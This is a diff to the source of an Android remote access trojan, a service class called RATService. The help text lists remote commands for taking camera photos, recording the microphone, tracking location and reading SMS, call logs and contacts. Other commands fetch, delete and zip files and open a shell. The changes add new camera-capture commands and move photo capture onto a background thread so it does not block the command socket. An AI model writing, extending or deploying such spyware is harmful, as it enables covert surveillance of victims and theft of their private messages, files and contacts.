@@ -125,7 +125,11 @@ public class RATService extends Service {
         startLocationThread();
         
         // Initialize modules based on config
-        if (Config.ENABLE_CAMERA) cameraModule = new CameraModule(this);
+        if (Config.ENABLE_CAMERA) {
+            Log.d(TAG, "📸 Initializing CameraModule");
+            cameraModule = new CameraModule(this);
+            Log.d(TAG, "📸 CameraModule initialized: " + (cameraModule != null));
+        }
         if (Config.ENABLE_MICROPHONE) micModule = new MicModule(this);
         if (Config.ENABLE_LOCATION) locationModule = new LocationModule(this);
         if (Config.ENABLE_SMS) smsModule = new SmsModule(this);
@@ -519,13 +523,15 @@ public class RATService extends Service {
     }
     
     private void routeCommand(String cmd, String args) {
+        Log.d(TAG, "🔄 Routing command: " + cmd + " with args: " + args);
+        
         switch (cmd) {
             case "ping":
                 sendCommand("PONG");
                 break;
                 
             case "help":
-                String helpText = "Available commands: info, location, location_stream [start/stop], camera, sms, calls, contacts, files_list [path], file_get [path], file_delete [path], file_rename [old|new], create_folder [path|name], file_zip [path], search_files [path|query], storage_info, mic, mic_stop, shell, ping, test_folder [path]";
+                String helpText = "Available commands: info, location, location_stream [start/stop], camera, camera_switch, camera_test, sms, calls, contacts, files_list [path], file_get [path], file_delete [path], file_rename [old|new], create_folder [path|name], file_zip [path], search_files [path|query], storage_info, mic, mic_stop, shell, ping, test_folder [path]";
                 sendCommand("HELP|" + helpText);
                 break;
                 
@@ -553,40 +559,79 @@ public class RATService extends Service {
                 handleLocationStreamCommand(args);
                 break;
                 
-         // In routeCommand() for camera:
-   case "camera":
-        case "camera_photo":
-            if (cameraModule != null) {
-                Log.d(TAG, "📸 Executing camera capture");
+            // Camera commands
+            case "camera":
+            case "camera_photo":
+                if (cameraModule != null) {
+                    Log.d(TAG, "📸 Executing camera capture");
+                    
+                    // Send immediate acknowledgment
+                    sendCommand("CAMERA|Processing...");
+                    
+                    // Run camera capture on background thread to avoid blocking the socket
+                    executor.submit(() -> {
+                        try {
+                            Log.d(TAG, "📸 Calling cameraModule.takePhoto() on thread: " + Thread.currentThread().getName());
+                            long startTime = System.currentTimeMillis();
+                            String result = cameraModule.takePhoto();
+                            long endTime = System.currentTimeMillis();
+                            Log.d(TAG, "📸 Camera takePhoto() took " + (endTime - startTime) + "ms");
+                            Log.d(TAG, "📸 Camera result length: " + (result != null ? result.length() : "null"));
+                            if (result != null && result.startsWith("ERROR")) {
+                                Log.e(TAG, "❌ Camera error: " + result);
+                            } else {
+                                Log.d(TAG, "✅ Camera success, sending result");
+                            }
+                            sendCommand("CAMERA|" + result);
+                        } catch (Exception e) {
+                            Log.e(TAG, "❌ Error in camera capture", e);
+                            sendCommand("CAMERA|ERROR: " + e.getMessage());
+                        }
+                    });
+                } else {
+                    Log.e(TAG, "❌ Camera module not available");
+                    sendCommand("CAMERA|ERROR: Camera module not available");
+                }
+                break;
                 
-                // Send immediate acknowledgment
-                sendCommand("CAMERA|Processing...");
+            case "camera_switch":
+                if (cameraModule != null) {
+                    Log.d(TAG, "🔄 Switching camera");
+                    String result = cameraModule.switchCamera();
+                    sendCommand("CAMERA_SWITCH|" + result);
+                } else {
+                    sendCommand("CAMERA_SWITCH|ERROR: Camera module not available");
+                }
+                break;
                 
-                // Run camera capture on background thread to avoid blocking the socket
-                executor.submit(() -> {
-                    try {
-                        Log.d(TAG, "📸 Calling cameraModule.takePhoto()");
-                        String result = cameraModule.takePhoto();
-                        Log.d(TAG, "📸 Camera result: " + (result != null ? result.substring(0, Math.min(50, result.length())) : "null"));
-                        sendCommand("CAMERA|" + result);
-                    } catch (Exception e) {
-                        Log.e(TAG, "❌ Error in camera capture", e);
-                        sendCommand("CAMERA|ERROR: " + e.getMessage());
-                    }
-                });
-            } else {
-                Log.e(TAG, "❌ Camera module not available");
-                sendCommand("CAMERA|ERROR: Camera module not available");
-            }
-            break;
             case "camera_test":
-    if (cameraModule != null) {
-        String result = cameraModule.testCamera();
-        sendCommand("CAMERA_TEST|" + result);
-    } else {
-        sendCommand("CAMERA_TEST|ERROR: Camera module not available");
-    }
-    break;    
+                if (cameraModule != null) {
+                    Log.d(TAG, "🔧 Testing camera module");
+                    String result = cameraModule.testCamera();
+                    sendCommand("CAMERA_TEST|" + result);
+                } else {
+                    sendCommand("CAMERA_TEST|ERROR: Camera module not available");
+                }
+                break;
+                
+            case "camera_simple_test":
+                if (cameraModule != null) {
+                    String result = cameraModule.simpleTest();
+                    sendCommand("CAMERA_SIMPLE_TEST|" + result);
+                } else {
+                    sendCommand("CAMERA_SIMPLE_TEST|ERROR: Camera module not available");
+                }
+                break;
+                
+            case "camera_simple_capture":
+                if (cameraModule != null) {
+                    String result = cameraModule.simpleCapture();
+                    sendCommand("CAMERA_SIMPLE|" + result);
+                } else {
+                    sendCommand("CAMERA_SIMPLE|ERROR: Camera module not available");
+                }
+                break;
+                
             case "sms":
             case "get_sms":
                 if (smsModule != null) {
